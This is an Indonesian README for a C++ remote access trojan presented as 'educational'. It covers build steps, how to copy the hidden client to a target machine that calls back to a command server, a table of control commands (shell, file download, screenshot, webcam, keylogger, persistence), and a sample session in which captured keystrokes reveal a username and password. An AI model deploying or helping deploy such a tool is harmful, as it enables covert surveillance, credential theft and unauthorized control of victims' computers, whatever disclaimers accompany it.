# Educational RAT (Remote Access Trojan)

**PENTING:** Software ini dikembangkan **HANYA UNTUK TUJUAN PENDIDIKAN**.
Penggunaan tool ini untuk mengakses sistem tanpa izin eksplisit adalah ILEGAL.

## Deskripsi

Educational RAT adalah implementasi Remote Access Trojan untuk tujuan belajar konsep:

- Pemrograman jaringan client-server
- Komunikasi terenkripsi antar aplikasi
- Interaksi dengan sistem operasi
- Arsitektur software terdistribusi

Tool ini mendemonstrasikan bagaimana aplikasi remote access bekerja dengan fitur-fitur:

- Remote shell execution
- File manager (browse, upload, download)
- Screen capture
- Webcam capture
- Audio recording
- Process management
- Persistence (autorun)
- Keylogger

## Peringatan Hukum

Menggunakan software ini untuk mengakses sistem tanpa izin eksplisit adalah ILEGAL dan dapat berakibat:

- Tuntutan pidana
- Gugatan perdata
- Sanksi akademis

## Tech Stack & Library

### Bahasa Pemrograman

- C++17 (standar kompilasi)

### Library Utama

- **OpenSSL** - Untuk enkripsi komunikasi (AES-256-CBC)
- **POSIX Threads** - Untuk multithreading
- **Socket API** - Untuk komunikasi jaringan
- **Standard C++ Library** - STL containers, string manipulation, dll

### Library Sistem

- **dirent.h** - Untuk operasi direktori
- **sys/utsname.h** - Untuk informasi sistem
- **sys/stat.h** - Untuk status file
- **pwd.h** - Untuk informasi user
- **X11** - Untuk operasi screenshot di Linux
- **GDI+** - Untuk operasi screenshot di Windows

### Komponen Utama

- **Protocol** - Komunikasi custom binary dengan header dan payload
- **Crypto** - Enkripsi AES dengan IV dan checksums
- **Network** - Socket handling dengan TCP
- **Utils** - Helper functions (random string, checksum calculation, dll)
- **Platform** - Abstraksi untuk dukungan cross-platform

## Struktur Proyek

- `server/` - Command and control server
- `client/` - Komponen client yang berjalan di sistem target
- `common/` - Kode yang digunakan bersama antara server dan client
- `client/src/platform/` - Implementasi platform-specific (Windows, Linux)
- `docs/` - Dokumentasi dan resources pembelajaran
- `bin/` - Direktori untuk executable hasil kompilasi

## Cara Membangun (Build)

### Prasyarat

#### Linux/Unix

- Compiler C++ (GCC/Clang)
- Library OpenSSL development
- X11 development libraries
- Build tools (make)

#### Windows

- MinGW-w64 dengan GCC
- OpenSSL untuk Windows
- GDI+ (bagian dari Windows SDK)
- Build tools (mingw32-make)

### Instalasi Dependencies

#### Pada Debian/Ubuntu:

```bash
sudo apt update
sudo apt install build-essential libssl-dev libx11-dev
```

#### Pada Fedora/RHEL/CentOS:

```bash
sudo dnf install gcc-c++ openssl-devel libX11-devel make
# atau
sudo yum install gcc-c++ openssl-devel libX11-devel make
```

#### Pada Windows:

Lihat file `docs/WINDOWS_SETUP.md` untuk instruksi detail tentang pengaturan lingkungan Windows.

### Langkah Kompilasi

#### Linux/Unix:

```bash
# Buat direktori bin
make setup

# Build server dan client
make

# Atau build komponen terpisah
make server
make client
```

#### Windows (menggunakan MinGW):

```bash
# Gunakan target windows khusus di Makefile
mingw32-make windows
```

Atau kompilasi manual:

```bash
# Server
g++ -Wall -std=c++17 -D_WIN32 server/src/*.cpp common/src/*.cpp -o bin/server.exe -lpthread -lcrypto -lssl -lws2_32

# Client
g++ -Wall -std=c++17 -D_WIN32 client/src/*.cpp common/src/*.cpp -o bin/client.exe -lpthread -lcrypto -lssl -lws2_32 -lgdi32 -lgdiplus -luserenv
```

## Cara Penggunaan

### Skenario Implementasi

Berikut adalah skenario penggunaan umum untuk tujuan pendidikan:

1. **Laboratorium Terpisah**: Gunakan dalam jaringan terpisah (lab) yang dikhususkan untuk pengujian keamanan.
2. **Sistem Virtual**: Gunakan dalam sistem virtual yang terisolasi untuk mempelajari cara kerja RAT.
3. **Lingkungan Sandbox**: Implementasikan dalam sandbox keamanan untuk analisis perilaku.

### Menjalankan Server

```bash
./bin/server [options]
```

Options:

- `-p, --port PORT` - Spesifikasi port (default: 8080)
- `-h, --help` - Menampilkan pesan bantuan

### Menjalankan Client

```bash
./bin/client [options]
```

Options:

- `-s, --server ADDR` - Alamat server (default: 127.0.0.1)
- `-p, --port PORT` - Port server (default: 8080)
- `-i, --interval SECONDS` - Interval reconnect dalam detik (default: 30)
- `-h, --help` - Menampilkan pesan bantuan

### Menghubungkan Server dan Client

#### 1. Langkah Persiapan:

Sebelum menjalankan server dan client, pastikan:

- Port yang akan digunakan terbuka di firewall
- Jaringan antara server dan client terhubung
- Alamat IP server diketahui (gunakan `ifconfig` atau `ip addr` di Linux; `ipconfig` di Windows)

#### 2. Memulai Server:

- Jalankan executable server:

  ```bash
  # Di Linux
  ./bin/server -p 8080

  # Di Windows
  bin\server.exe -p 8080
  ```

- Server akan menampilkan pesan "Listening on port 8080" jika berhasil
- Biarkan terminal server tetap terbuka

#### 3. Menjalankan Client:

- Salin executable client ke komputer target
- Jalankan client dengan parameter alamat server:

  ```bash
  # Di Linux
  ./bin/client -s 192.168.1.100 -p 8080

  # Di Windows
  bin\client.exe -s 192.168.1.100 -p 8080
  ```

- Client akan otomatis terhubung ke server dan berjalan di background
- Tidak ada output yang ditampilkan pada terminal client

#### 4. Mengkonfirmasi Koneksi:

- Di terminal server, Anda akan melihat pesan "New client connected: [CLIENT_ID]"
- Gunakan perintah `list` untuk melihat semua client yang terhubung

### Perintah Server

Setelah server berjalan dan client terhubung, Anda dapat menggunakan perintah-perintah berikut:

| Perintah     | Format                                            | Deskripsi                                        |
| ------------ | ------------------------------------------------- | ------------------------------------------------ |
| `help`       | `help`                                            | Menampilkan daftar perintah yang tersedia        |
| `list`       | `list`                                            | Menampilkan daftar client yang terhubung         |
| `select`     | `select <client_id>`                              | Memilih client untuk berinteraksi                |
| `ping`       | `ping <client_id>`                                | Mengirim ping ke client                          |
| `shell`      | `shell <client_id> <command>`                     | Menjalankan perintah shell di client             |
| `screenshot` | `screenshot <client_id>`                          | Mengambil screenshot dari client                 |
| `webcam`     | `webcam <client_id>`                              | Mengambil gambar dari webcam client              |
| `files`      | `files <client_id> <path>`                        | Menampilkan daftar file di direktori pada client |
| `download`   | `download <client_id> <remote_path> <local_path>` | Mengunduh file dari client                       |
| `upload`     | `upload <client_id> <local_path> <remote_path>`   | Mengunggah file ke client                        |
| `ps`         | `ps <client_id>`                                  | Menampilkan daftar proses pada client            |
| `kill`       | `kill <client_id> <pid>`                          | Menghentikan proses pada client                  |
| `keylogger`  | `keylogger <client_id> <start\|stop\|dump>`       | Mengontrol keylogger                             |
| `persist`    | `persist <client_id>`                             | Memasang persistence pada client                 |
| `unpersist`  | `unpersist <client_id>`                           | Menghapus persistence dari client                |
| `broadcast`  | `broadcast <command>`                             | Menjalankan perintah pada semua client           |
| `exit`       | `exit`                                            | Keluar dari program server                       |

### Contoh Penggunaan

Berikut adalah contoh sesi penggunaan server:

```
$ ./bin/server
Server started on port 8080
Waiting for connections...

[+] New client connected: c1e4a8f2 (192.168.1.105)

> list
Connected clients:
ID: c1e4a8f2 | IP: 192.168.1.105 | Hostname: desktop-user | OS: Linux 5.4.0-42-generic

> select c1e4a8f2
Selected client: c1e4a8f2

> shell c1e4a8f2 whoami
user1

> files c1e4a8f2 /home/user1
drwxr-xr-x Documents
drwxr-xr-x Downloads
-rw-r--r-- example.txt

> download c1e4a8f2 /home/user1/example.txt ./downloaded_example.txt
File downloaded successfully: ./downloaded_example.txt

> screenshot c1e4a8f2
Screenshot saved as: screenshot_c1e4a8f2_2023-06-15_10-30-45.png

> keylogger c1e4a8f2 start
Keylogger started on client c1e4a8f2

> keylogger c1e4a8f2 dump
Keylogger data:
username[Tab]password[Enter]ls -la[Enter]

> keylogger c1e4a8f2 stop
Keylogger stopped on client c1e4a8f2

> exit
Server shutting down...
```

## Troubleshooting

### Koneksi Gagal

- **Masalah**: Client tidak dapat terhubung ke server
- **Solusi**:
  - Pastikan server berjalan dan mendengarkan port yang benar
  - Verifikasi alamat IP server benar
  - Periksa firewall yang mungkin memblokir koneksi
  - Pastikan port forwarding dikonfigurasi jika berada di jaringan berbeda

### Client Terputus

- **Masalah**: Client terputus dari server
- **Solusi**:
  - Client secara default akan coba terhubung kembali setiap 30 detik
  - Untuk mengubah interval, gunakan opsi `-i` saat menjalankan client
  - Verifikasi tidak ada masalah jaringan

### Permission Issues

- **Masalah**: Operasi gagal karena masalah izin
- **Solusi**:
  - Pastikan executable memiliki izin eksekusi (`chmod +x bin/server bin/client`)
  - Untuk beberapa operasi (seperti keylogger), client mungkin memerlukan hak administratif
  - Di Windows, coba jalankan sebagai Administrator

### Error Kompilasi

- **Masalah**: Error saat kompilasi
- **Solusi**:
  - Pastikan semua dependencies terinstal
  - Untuk error terkait OpenSSL, verifikasi development headers terinstal
  - Untuk Windows, lihat `docs/WINDOWS_SETUP.md` untuk troubleshooting detail

## Pengembangan Cross-Platform

Project ini mendukung Linux dan Windows melalui abstraksi platform:

- `client/src/platform/linux.h` - Implementasi Linux
- `client/src/platform/windows.h` - Implementasi Windows
- `client/src/platform/platform.h` - Header utama yang menyediakan abstraksi

Untuk mengembangkan pada platform baru:

1. Buat file header baru (misalnya `macos.h`)
2. Implementasikan semua fungsi yang dibutuhkan dengan namespace `Platform`
3. Update `platform.h` untuk menyertakan header baru berdasarkan definisi platform

## Dokumentasi Lebih Lanjut

Lihat direktori `docs/` untuk dokumentasi teknis lebih detail:

- `docs/SETUP.md` - Instruksi pengaturan dan build
- `docs/TECHNICAL.md` - Dokumentasi teknis tentang arsitektur
- `docs/SECURITY.md` - Pertimbangan keamanan
- `docs/WINDOWS_SETUP.md` - Panduan khusus untuk pengaturan Windows
- `docs/GITHUB_SETUP.md` - Cara mengupload project ke GitHub

## Pengupload ke GitHub

Untuk petunjuk tentang cara mengupload project ini ke GitHub, lihat file `docs/GITHUB_SETUP.md` yang berisi panduan langkah demi langkah.

## Pembelajaran Lebih Lanjut

Untuk mempelajari lebih lanjut tentang cybersecurity, pertimbangkan sumber-sumber resmi ini:

- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.eu/)
- [Cybrary](https://www.cybrary.it/)
- [OWASP](https://owasp.org/)

## Lisensi

Software ini dilisensikan di bawah MIT License, hanya untuk tujuan pendidikan.
